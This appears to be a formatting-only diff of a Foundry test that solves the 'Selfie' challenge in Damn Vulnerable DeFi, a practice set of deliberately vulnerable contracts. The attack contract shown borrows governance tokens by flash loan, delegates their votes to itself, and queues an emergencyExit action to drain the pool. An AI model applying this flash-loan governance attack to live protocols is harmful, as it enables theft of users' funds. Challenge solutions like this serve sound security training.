@@ -64,12 +64,8 @@ contract SelfieChallenge is Test {
      */
     function test_selfie() public checkSolvedByPlayer {
         // Deploy the attack contract
-        StealMoneyFromPool attacker = new StealMoneyFromPool(
-            address(pool),
-            address(governance),
-            address(token),
-            recovery
-        );
+        StealMoneyFromPool attacker =
+            new StealMoneyFromPool(address(pool), address(governance), address(token), recovery);
         // Execute the attack
         attacker.attack();
         vm.warp(block.timestamp + 2 days);
@@ -83,11 +79,7 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(
-            token.balanceOf(recovery),
-            TOKENS_IN_POOL,
-            "Not enough tokens in recovery account"
-        );
+        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
 }
 
@@ -98,12 +90,7 @@ contract StealMoneyFromPool {
     address recovery;
     uint256 actionId;
 
-    constructor(
-        address _pool,
-        address _governance,
-        address _token,
-        address _recovery
-    ) {
+    constructor(address _pool, address _governance, address _token, address _recovery) {
         pool = SelfiePool(_pool);
         governance = SimpleGovernance(_governance);
         token = DamnValuableVotes(_token);
@@ -112,33 +99,16 @@ contract StealMoneyFromPool {
 
     function attack() external {
         // Flash loan
-        bytes memory data = abi.encodeWithSignature(
-            "emergencyExit(address)",
-            recovery
-        );
-        pool.flashLoan(
-            IERC3156FlashBorrower(address(this)),
-            address(token),
-            1_500_000e18,
-            data
-        );
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000e18, data);
     }
 
-    function onFlashLoan(
-        address _initiator,
-        address,
-        uint256 _amount,
-        uint256,
-        bytes calldata data
-    ) external returns (bytes32) {
-        require(
-            msg.sender == address(pool),
-            "SelfieAttacker: Only pool can call"
-        );
-        require(
-            _initiator == address(this),
-            "SelfieAttacker: Initiator is not self"
-        );
+    function onFlashLoan(address _initiator, address, uint256 _amount, uint256, bytes calldata data)
+        external
+        returns (bytes32)
+    {
+        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
+        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");
         // Delegate votes to ourself so we can queue an action
         token.delegate(address(this));
         // Queue the action to drain the pool
